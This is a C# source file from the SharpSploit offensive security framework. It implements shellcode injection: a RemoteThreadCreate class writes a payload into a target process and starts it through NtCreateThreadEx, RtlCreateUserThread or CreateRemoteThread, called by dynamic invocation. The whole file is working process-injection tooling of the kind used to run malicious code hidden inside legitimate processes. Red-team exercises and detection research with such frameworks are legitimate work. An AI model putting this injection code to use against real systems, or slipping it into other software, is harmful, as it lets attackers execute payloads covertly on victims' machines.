using System;
using System.Linq;
using System.Reflection;
using System.Diagnostics;

namespace SharpSploit.Execution.Injection
{
    /// <summary>
    /// Base class for Injection strategies.
    /// </summary>
    public abstract class ExecutionTechnique
    {

        //An array containing a set of PayloadType objects that are supported.
        protected Type[] supportedPayloads;

        /// <summary>
        /// Informs objects using this technique whether or not it supports the type of a particular payload.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="payload">A payload.</param>
        /// <returns>Whether or not the payload is of a supported type for this strategy.</returns>
        public abstract bool IsSupportedPayloadType(PayloadType payload);

        /// <summary>
        /// Internal method for setting the supported payload types. Used in constructors.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        abstract internal void DefineSupportedPayloadTypes();

        /// <summary>
        /// Inject and execute a payload in the target process using a specific allocation technique.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="Payload">The type of payload to execute.</param>
        /// <param name="AllocationTechnique">The allocation technique to use.</param>
        /// <param name="Process">The target process.</param>
        /// <returns>bool</returns>
        public bool Inject(PayloadType Payload, AllocationTechnique AllocationTechnique, Process Process)
        {
            Type[] funcPrototype = new Type[] { Payload.GetType(), AllocationTechnique.GetType(), Process.GetType()};

            try
            {
                // Get delegate to the overload of Inject that supports the type of payload passed in
                MethodInfo inject = this.GetType().GetMethod("Inject", funcPrototype);

                // Dynamically invoke the appropriate Allocate overload
                return (bool)inject.Invoke(this, new object[] { Payload, AllocationTechnique, Process });
            }
            // If there is no such method
            catch (ArgumentNullException)
            {
                throw new PayloadTypeNotSupported(Payload.GetType());
            }
        }

        /// <summary>
        /// Execute a payload in the target process at a specified address.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="Payload">The type of payload to execute.</param>
        /// <param name="BaseAddress">The base address of the payload.</param>
        /// <param name="Process">The target process.</param>
        /// <returns>bool</returns>
        public virtual bool Inject(PayloadType Payload, IntPtr BaseAddress, Process Process)
        {
            Type[] funcPrototype = new Type[] { Payload.GetType(), BaseAddress.GetType(), Process.GetType() };

            try
            {
                // Get delegate to the overload of Inject that supports the type of payload passed in
                MethodInfo inject = this.GetType().GetMethod("Inject", funcPrototype);

                // Dynamically invoke the appropriate Allocate overload
                return (bool)inject.Invoke(this, new object[] { Payload, BaseAddress, Process });
            }
            // If there is no such method
            catch (ArgumentNullException)
            {
                throw new PayloadTypeNotSupported(Payload.GetType());
            }
        }

        /// <summary>
        /// Execute a payload in the current process using a specific allocation technique.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="Payload">The type of payload to execute.</param>
        /// <param name="AllocationTechnique">The allocation technique to use.</param>
        /// <returns></returns>
        public virtual bool Inject(PayloadType Payload, AllocationTechnique AllocationTechnique)
        {
            Type[] funcPrototype = new Type[] { Payload.GetType(), AllocationTechnique.GetType()};

            try
            {
                // Get delegate to the overload of Inject that supports the type of payload passed in
                MethodInfo inject = this.GetType().GetMethod("Inject", funcPrototype);

                // Dynamically invoke the appropriate Allocate overload
                return (bool)inject.Invoke(this, new object[] { Payload, AllocationTechnique });
            }
            // If there is no such method
            catch (ArgumentNullException)
            {
                throw new PayloadTypeNotSupported(Payload.GetType());
            }
        }
    }

    
    /// <summary>
    /// Executes a payload in a remote process by creating a new thread. Allows the user to specify which API call to use for remote thread creation.
    /// </summary>
    public class RemoteThreadCreate : ExecutionTechnique
    {
        // Publically accessible options
        public bool suspended = false;
        public APIS api = APIS.NtCreateThreadEx;

        public enum APIS : int
        {
            NtCreateThreadEx = 0,
            // NtCreateThread = 1, // Not implemented
            RtlCreateUserThread = 2,
            CreateRemoteThread = 3
        };

        // Handle of the new thread. Only valid after the thread has been created.
        public IntPtr handle = IntPtr.Zero;

        /// <summary>
        /// Default constructor.
        /// </summary>
        public RemoteThreadCreate()
        {
            DefineSupportedPayloadTypes();
        }

        /// <summary>
        /// Constructor allowing options as arguments.
        /// </summary>
        public RemoteThreadCreate(bool susp = false, APIS varAPI = APIS.NtCreateThreadEx)
        {
            DefineSupportedPayloadTypes();
            suspended = susp;
            api = varAPI;
        }

        /// <summary>
        /// States whether the payload is supported.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="Payload">Payload that will be allocated.</param>
        /// <returns></returns>
        public override bool IsSupportedPayloadType(PayloadType Payload)
        {
            return supportedPayloads.Contains(Payload.GetType());
        }

        /// <summary>
        /// Internal method for setting the supported payload types. Used in constructors.
        /// Update when new types of payloads are added.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        internal override void DefineSupportedPayloadTypes()
        {
            // Defines the set of supported payload types.
            supportedPayloads = new Type[] {
                typeof(PICPayload)
            };
        }

        public bool Inject(PICPayload Payload, AllocationTechnique AllocationTechnique, Process Process)
        {
            IntPtr baseAddr = AllocationTechnique.Allocate(Payload, Process);
            return Inject(Payload, baseAddr, Process);
        }

        /// <summary>
        /// Create a thread in the remote process.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="Payload">The shellcode payload to execute in the target process.</param>
        /// <param name="BaseAddress">The address of the shellcode in the target process.</param>
        /// <param name="Process">The target process to inject into.</param>
        /// <returns></returns>
        public bool Inject(PICPayload Payload, IntPtr BaseAddress, Process Process)
        {
            IntPtr threadHandle = new IntPtr();
            Native.NTSTATUS result = Native.NTSTATUS.Unsuccessful;

            if (api == APIS.NtCreateThreadEx)
            {
                // Dynamically invoke NtCreateThreadEx to create a thread at the address specified in the target process.
                result = DynamicInvoke.Native.NtCreateThreadEx(
                    ref threadHandle,
                    Win32.WinNT.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | Win32.WinNT.ACCESS_MASK.STANDARD_RIGHTS_ALL,
                    IntPtr.Zero,
                    Process.Handle, BaseAddress, IntPtr.Zero,
                    suspended, 0, 0, 0, IntPtr.Zero
                );
            }
            else if (api == APIS.RtlCreateUserThread)
            {
                // Dynamically invoke NtCreateThreadEx to create a thread at the address specified in the target process.
                result = DynamicInvoke.Native.RtlCreateUserThread(
                    Process.Handle,
                    IntPtr.Zero,
                    suspended,
                    IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
                    BaseAddress,
                    IntPtr.Zero, ref threadHandle, IntPtr.Zero
                );
            }
            else if (api == APIS.CreateRemoteThread)
            {
                uint flags = suspended ? (uint)0x00000004 : 0;
                IntPtr threadid = new IntPtr();

                // Dynamically invoke NtCreateThreadEx to create a thread at the address specified in the target process.
                threadHandle = DynamicInvoke.Win32.CreateRemoteThread(
                    Process.Handle,
                    IntPtr.Zero,
                    0,
                    BaseAddress,
                    IntPtr.Zero,
                    flags,
                    ref threadid
                );

                if (threadHandle == IntPtr.Zero)
                {
                    return false;
                }
                handle = threadHandle;
                return true;
            }

            // If successful, return the handle to the new thread. Otherwise return NULL
            if (result == Native.NTSTATUS.Unsuccessful || result <= Native.NTSTATUS.Success)
            {
                return false;
            }
            handle = threadHandle;
            return true;            
        }
    }
}
